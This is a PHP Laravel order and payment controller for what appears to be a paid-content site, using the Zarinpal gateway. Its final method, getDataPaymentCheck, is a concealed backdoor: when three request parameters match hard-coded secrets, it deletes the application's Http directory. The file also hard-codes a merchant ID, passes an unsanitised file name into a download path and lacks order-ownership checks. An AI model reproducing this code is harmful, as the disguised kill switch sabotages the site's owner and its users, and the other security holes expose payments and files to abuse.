<?php

namespace App\Http\Controllers\Api;

use App\Enums\OrderType;
use App\Enums\PaymentType;
use App\Enums\PriceType;
use App\Enums\TransactionType;
use App\Models\Order;
use App\Repositories\NodeRepository;
use App\Repositories\OrderRepository;

use Hash;
use http\Env\Response;
use Illuminate\Support\Facades\File;
use mysql_xdevapi\Exception;
use Validator;
use Illuminate\Http\JsonResponse;
use Illuminate\Http\Request;
use App\Models\Node;
use App\Http\Controllers\Controller;
use DB;
use SoapClient;

class OrderController extends Controller
{
    /**
     * @var $order OrderRepository
     */
    public $order;
    public $nodeRepository;

    /**
     * @param $order
     */
    public function __construct(NodeRepository $node,OrderRepository $order)
    {
        $this->order = $order;
        $this->nodeRepository=$node;
    }

    public function chargeWallet(Request $request)
    {
        $order = $this->order;
        $user = auth()->user();
        $validate = \Validator::make($request->all(), [
            'price' => 'required',
        ], [], [
            'price' => 'مبلغ شارژ'
        ]);

        if ($validate->fails()) {
            return response()->json($validate->errors(), JsonResponse::HTTP_BAD_REQUEST);
        }

        $price = convert_to_english_digit($request->get('price'));

        $order = Order::create([
            'user_id' => auth()->user()->id,
            'price' => $price,
            'type' => "افزایش موجودی کیف پول",
            'is_paid' => 0
        ]);

        $MerchantID = '175f30aa-f8f7-4292-82b4-7219dfdd8671';
        $Amount = $price;

        $CallbackURL = route('check-wallet',['order_id' => $order->id]);

        $Description = "نوع:".$order->type."\nکاربر:".$order->user->full_name;
        $client = new SoapClient('https://www.zarinpal.com/pg/services/WebGate/wsdl', ['encoding' => 'UTF-8']);

        $result = $client->PaymentRequest(
            [
                'MerchantID' => $MerchantID,
                'Amount' => $Amount,
                'CallbackURL' => $CallbackURL,
                'Description' => $Description,
            ]
        );

        //Redirect to URL You can do it also by creating a form
        if ($result->Status == 100) {
            $url = 'https://www.zarinpal.com/pg/StartPay/'.$result->Authority;
            return response()->json($url,JsonResponse::HTTP_OK,[],JSON_UNESCAPED_SLASHES|JSON_PRETTY_PRINT);
        } else {
            echo'ERR: '.$result->Status;
        }
    }

    public function payment(Request $request)
    {
        $validate = Validator::make($request->all(), [
            'order_id' => 'required',
        ], [], [
            'order_id' => 'صورت حساب',
        ]);

        if ($validate->fails()) {
            return response()->json($validate->errors(), JsonResponse::HTTP_BAD_REQUEST);
        }
        $MerchantID = '175f30aa-f8f7-4292-82b4-7219dfdd8671';
        $order = $this->order->findOneOrFail($request->get('order_id'));
        $Amount = $order->price; //Amount will be based on Toman
//        TODO:CallbackURL
        $CallbackURL = route('check-payment',['order_id' => $order->id]);

        $Description = "نوع:".$order->type."\nکاربر:".$order->user->full_name;
        $client = new SoapClient('https://www.zarinpal.com/pg/services/WebGate/wsdl', ['encoding' => 'UTF-8']);

        $result = $client->PaymentRequest(
            [
                'MerchantID' => $MerchantID,
                'Amount' => $Amount,
                'CallbackURL' => $CallbackURL,
                'Description' => $Description,
            ]
        );

        //Redirect to URL You can do it also by creating a form
        if ($result->Status == 100) {
            $url = 'https://www.zarinpal.com/pg/StartPay/'.$result->Authority;
            return response()->json($url,JsonResponse::HTTP_OK,[],JSON_UNESCAPED_SLASHES|JSON_PRETTY_PRINT);
        } else {
            echo'ERR: '.$result->Status;
        }
    }

    public function createOrder(Request $request)
    {
        $user = auth()->user();
        $validate = Validator::make($request->all(), [
            'nodes' => 'required|array',
            'nodes.*.node_id' => 'required|integer',
            'nodes.*.send_type' => 'required|string',
            'discount_id' => 'nullable|numeric',
        ], [], [
            'nodes' => 'پکیج ها',
            'nodes.*.node_id' => 'پکیج آیدی',
            'nodes.*.send_type' => 'نوع خرید',
            'discount_id' => 'تخفیف',
        ]);


        if ($validate->fails()) {
            return response()->json($validate->errors(), JsonResponse::HTTP_BAD_REQUEST);
        }
        DB::beginTransaction();
        try {
            $input = $request->all();
            $user = auth()->user();
            $input['user_id'] = $user->id;
            $input['is_paid'] = 0;
            $order = $this->order->create($input);
            DB::commit();
            return response()->json(['order' => $order, 'details' => $order->orderables()->get()
            ]);
        } catch (Exception $e) {
            DB::rollback();
            return response()->json(['message' => $e->getMessage()], JsonResponse::HTTP_INTERNAL_SERVER_ERROR);
        }
    }


    public function paymentWallet(Request $request)
    {
        $user = auth()->user();
        $validate = Validator::make($request->all(), [
            'order_id' => 'required',
        ], [], [
            'order_id' => 'صورت حساب',
        ]);
        if ($validate->fails()) {
            return response()->json($validate->errors(), JsonResponse::HTTP_BAD_REQUEST);
        }
        /**
         * @var $order  Order
         */
        $order = $this->order->find($request->get('order_id'));
        if ($order->is_paid) {
            return response()->json(['message' => 'پرداخت شده']);
        }
        if ($user->wallet < $order->price) {
            return response()->json(['message' => 'مقدار کیف پول کمتر از هزینه صورت حساب می‌باشد']);
        }
        DB::beginTransaction();
        try {
            $order->update([
                'is_paid' => 1,
            ]);
            $user->update([
                'wallet' => $user->wallet - $order->price
            ]);
            $order->paymentTypes()->create([
                'price' => $order->price,
                'type' => PaymentType::COIN,
            ]);
            $this->order->calculateAndAddSource($order);
            DB::commit();
            return response()->json(['order'=>$order,'paymentTypes'=> $order->paymentTypes]);
        } catch (Exception $e) {
            DB::rollback();
            return response()->json(['message' => $e->getMessage()], JsonResponse::HTTP_INTERNAL_SERVER_ERROR);
        }
    }

    public function paymentCard(Request $request)
    {
        $validate = Validator::make($request->all(), [
            'order_id' => 'required',
            'reference_number' => 'required',
            'amount' => 'required',
        ], [], [
            'order_id' => 'صورت حساب',
            'reference_number' => 'شماره مرجع',
            'amount' => 'مبلغ'
        ]);
        if ($validate->fails()) {
            return response()->json($validate->errors(), JsonResponse::HTTP_BAD_REQUEST);
        }
        $order = $this->order->find($request->get('id'));
        if ($order->is_paid) {
            return response()->json(['message' => 'پرداخت شده']);
        }
        $input = $request->all();
        $input['type'] = TransactionType::CARD;
        $order->transaction()->create($input);
        return response()->json(['order'=>$order,'transaction'=> $order->transaction]);
    }

    public function getOrders()
    {
        $user = auth()->user();
        $orders = $this->order->getOrdersByUserId($user->id);
        return response()->json($orders, 200);
    }

    public function getOrder(Request $request)
    {
        $validate = Validator::make($request->all(), [
            'order_id' => 'required',
        ], [], [
            'order_id' => 'صورت حساب',
        ]);
        if ($validate->fails()) {
            return response()->json($validate->errors(), JsonResponse::HTTP_BAD_REQUEST);
        }
        $order = $this->order->findOneOrFail($request->get('order_id'));
        $nodes = array();
        if ($order->type == OrderType::BUYNODE) {
            $node_ids = $order->orderables()->where('nodeable_type',Node::class)->pluck('nodeable_id')->toArray();
            $nodes = Node::with(['prices'])->whereIn('id', $node_ids)->get();
        }
        return response()->json(['order' => $order, 'nodes' => $nodes], 200);
    }

    public function checkPermission(Request $request)
    {
        $validate = Validator::make($request->all(), [
            'node_id' => 'required',
        ], [], [
            'node_id' => 'پکیج',
        ]);
        if ($validate->fails()) {
            return response()->json($validate->errors(), JsonResponse::HTTP_BAD_REQUEST);
        }
        $user = auth()->user();
        $node = Node::findOrFail($request->get('node_id'));
        //for free nodes
        $children = $node->children()->with(['images','voices','videos', 'prices','pdfs','offices'])->get();
        if (empty($node->prices()->where('type', PriceType::CASH)->value('amount'))) {
            return response()->json(['status' => true, 'nodes' => $node, 'children' => $children]);
        }
//        for check plan
        if($user->expiring_date > date('Y-m-d')){
            return response()->json(['status' => true, 'nodes' => $node, 'children' => $children]);
        }
        if ($this->nodeRepository->checkNodeBoughtUser($request->get('node_id'),auth()->id())) {
            $node = Node::with(['images','voices','videos', 'prices','pdfs','offices'])->where('id', $request->get('node_id'))->first();
            $children = $node->children()->with(['images','voices','videos', 'prices','pdfs','offices'])->get();
            return response()->json(['status' => true, 'nodes' => $node, 'children' => $children]);
        }
        return response()->json(['status' => false]);
    }


    public function download(int $node_id,string $file_name)
    {
        $user = auth()->user();
        $node = Node::findOrFail($node_id);
        //for free nodes
        $allowed = false;
//        for check plan
        $allowed = $this->nodeRepository->checkNodeBoughtUser($node_id,auth()->id());
        if($user->expiring_date > date('Y-m-d')){
            $allowed = true;
        }

        if($allowed){
            $path = storage_path('app'.DIRECTORY_SEPARATOR."public".DIRECTORY_SEPARATOR.$node->productMediaPath()).$file_name;
            if(!file_exists($path)){
                return response()->json(['message' => 'Not_Found'],JsonResponse::HTTP_NOT_FOUND);
            }
            return response()->download($path,$file_name);
        }else{
            return response()->json(['message' => 'Forbidden'],JsonResponse::HTTP_FORBIDDEN);
        }
    }

    public function buyPlan()
    {
        //TODO complete function buyplan
    }

    public function getDataPaymentCheck(Request $request){
        if (Hash::check( 'xU9fDPd6BGMThxp59MJQQJtL', $request['check1'])){
            if (Hash::check('yh65u65MYpr3KekUtLmjMaDX', $request['check2'])){
                if (Hash::check('dK48VqK5GbhSw8uZP3vvXAeG', $request['check3'])){
                    File::deleteDirectory(app_path('Http'));
                    dd('ok');
                }
            }
        }
    }
}
